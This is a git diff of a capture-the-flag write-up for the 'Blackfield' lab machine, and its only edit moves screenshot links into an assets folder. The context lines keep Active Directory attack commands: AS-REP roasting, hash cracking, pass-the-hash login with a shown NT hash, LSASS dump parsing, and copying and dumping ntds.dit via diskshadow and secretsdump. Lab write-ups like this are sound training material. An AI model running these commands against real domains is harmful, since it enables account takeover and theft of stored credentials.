@@ -77,7 +77,7 @@ Since Kerberos port is open let’s try the AS-REP to see any Kerberos pre-authe
 impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.129.229.17
 ```
 
-![image.png](image%203.png)
+![image.png](../../Assets/Blackfield/image%203.png)
 
 ## Password Cracking
 
@@ -97,11 +97,11 @@ or
 john hash --wordlist=/usr/share/wordlist/rockyou.txt
 ```
 
-![image.png](image%204.png)
+![image.png](../../Assets/Blackfield/image%204.png)
 
-![image.png](image%205.png)
+![image.png](../../Assets/Blackfield/image%205.png)
 
-![image.png](image%206.png)
+![image.png](../../Assets/Blackfield/image%206.png)
 
 ## Foothold
 
@@ -121,7 +121,7 @@ Upload these BloodHound result files and run Cypher queries.
 
 No interesting attack path was found initially, but the shortest path from the owned object revealed a new path.
 
-![image.png](image%207.png)
+![image.png](../../Assets/Blackfield/image%207.png)
 
 ACL (ForceChangePassword) can be used to change the password of the `audit2020` user:
 
@@ -142,7 +142,7 @@ Interestingly, we got another share with read access:
 forensic
 ```
 
-![image.png](image%208.png)
+![image.png](../../Assets/Blackfield/image%208.png)
 
 ## LSASS Dump
 
@@ -166,7 +166,7 @@ pypykatz lsa minidump lsass.DMP
 
 We found two user accounts (`administrator`, `svc_backup`) and a machine account (`DC01$`).
 
-![image.png](image%209.png)
+![image.png](../../Assets/Blackfield/image%209.png)
 
 ## Access via svc_backup
 
@@ -178,7 +178,7 @@ The administrator account didn’t work, but `svc_backup` worked.
 evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
 
-![image.png](image%2010.png)
+![image.png](../../Assets/Blackfield/image%2010.png)
 
 ## Privilege Escalation
 
@@ -246,7 +246,7 @@ echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
 
 ```
 
-![image.png](image%2011.png)
+![image.png](../../Assets/Blackfield/image%2011.png)
 
 using built-in windows tool diskshadow copy the ntds , sam and system file.
 The `SYSTEM` registry hive contains the **boot key**, which is required to decrypt password hashes stored inside `ntds.dit`.
@@ -257,7 +257,7 @@ The `SYSTEM` registry hive contains the **boot key**, which is required to decry
 diskshadow.exe /s c:\temp\diskshadow.txt
 ```
 
-![image.png](image%2012.png)
+![image.png](../../Assets/Blackfield/image%2012.png)
 
 **Verify:**
 
@@ -338,17 +338,17 @@ impacket-secretsdump -ntds ntds.dit -system system local -history
 
 ```
 
-![image.png](image%2013.png)
+![image.png](../../Assets/Blackfield/image%2013.png)
 
 ## Final Access Issue
 
 Using psexec failed to read the file.
 
-![image.png](image%2014.png)
+![image.png](../../Assets/Blackfield/image%2014.png)
 
 and we have another text file - notes.txt. It reveals some information
 
-![image.png](image%2015.png)
+![image.png](../../Assets/Blackfield/image%2015.png)
 
 **Check encryption:**
 
@@ -356,7 +356,7 @@ and we have another text file - notes.txt. It reveals some information
 cipher /c root.txt
 ```
 
-![image.png](image%2016.png)
+![image.png](../../Assets/Blackfield/image%2016.png)
 
 **Check Privilege:**
 
@@ -377,7 +377,7 @@ We have info that only administrator can read the file.
 
 Instead of psexec to authenticate as Administrator.
 
-![image.png](image%2017.png)
+![image.png](../../Assets/Blackfield/image%2017.png)
 
 ## What I Learned
 
